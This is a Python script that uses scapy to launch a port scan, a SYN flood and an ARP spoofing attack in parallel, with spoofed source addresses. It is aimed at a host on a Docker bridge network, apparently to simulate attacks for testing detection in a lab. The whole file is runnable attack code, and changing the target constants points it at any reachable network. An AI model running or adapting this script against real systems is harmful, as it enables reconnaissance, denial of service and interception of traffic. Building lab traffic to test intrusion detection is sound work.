import multiprocessing
import time
import subprocess
import sys
from scapy.all import IP, TCP, Ether, ARP, sendp

TARGET_IP = "10.5.0.10"
GATEWAY_IP = "10.5.0.1"
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

def get_active_bridge():
    if len(sys.argv) > 1 and sys.argv[1].startswith("br-"):
        return sys.argv[1]
    try:
        cmd = "docker network inspect lab_net -f '{{.Id}}' 2>/dev/null | cut -c1-12"
        bridge_id = subprocess.check_output(cmd, shell=True).decode().strip()
        if bridge_id:
            return f"br-{bridge_id}"
    except Exception:
        pass
    return "br-3b14d142cadc"

INTERFACE = get_active_bridge()

# --- Attack 1: PortScan Worker (Source IP: 10.5.0.50) ---
def run_portscan():
    print(f"🚀 [THREAD 1] Launching PortScan Probing (10.5.0.50 -> {TARGET_IP})...")
    src_ip = "10.5.0.50"
    for port in range(20, 60):
        pkt = Ether(dst=BROADCAST_MAC)/IP(src=src_ip, dst=TARGET_IP)/TCP(dport=port, flags="S")
        sendp(pkt, iface=INTERFACE, verbose=0)
        time.sleep(0.01)
    print("✅ [THREAD 1] PortScan Finished.")

# --- Attack 2: DoS / SYN Flood Worker (Source IP: 10.5.0.99) ---
def run_syn_flood():
    print(f"🚀 [THREAD 2] Launching DoS / SYN Flood (10.5.0.99 -> {TARGET_IP})...")
    src_ip = "10.5.0.99"
    pkt = Ether(dst=BROADCAST_MAC)/IP(src=src_ip, dst=TARGET_IP)/TCP(dport=80, flags="S")
    for _ in range(800):
        sendp(pkt, iface=INTERFACE, verbose=0)
    print("✅ [THREAD 2] DoS / SYN Flood Finished.")

# --- Attack 3: ARP Spoofing Worker (Source IP: 10.5.0.1) ---
def run_arp_spoof():
    print(f"🚀 [THREAD 3] Launching ARP Spoofing (10.5.0.1 -> {TARGET_IP})...")
    arp_pkt = Ether(dst=BROADCAST_MAC)/ARP(
        op=2,
        psrc=GATEWAY_IP,
        hwsrc="aa:bb:cc:dd:ee:ff",
        pdst=TARGET_IP
    )
    for _ in range(80):
        sendp(arp_pkt, iface=INTERFACE, verbose=0)
        time.sleep(0.02)
    print("✅ [THREAD 3] ARP Spoofing Finished.")

if __name__ == "__main__":
    print("=" * 65)
    print(f"🔥 LAUNCHING MULTI-VECTOR ATTACK SIMULATION ON [{INTERFACE}] 🔥")
    print("=" * 65)

    p1 = multiprocessing.Process(target=run_portscan)
    p2 = multiprocessing.Process(target=run_syn_flood)
    p3 = multiprocessing.Process(target=run_arp_spoof)

    p1.start()
    p2.start()
    p3.start()

    p1.join()
    p2.join()
    p3.join()

    print("\n[+] All simultaneous attack vectors executed successfully.")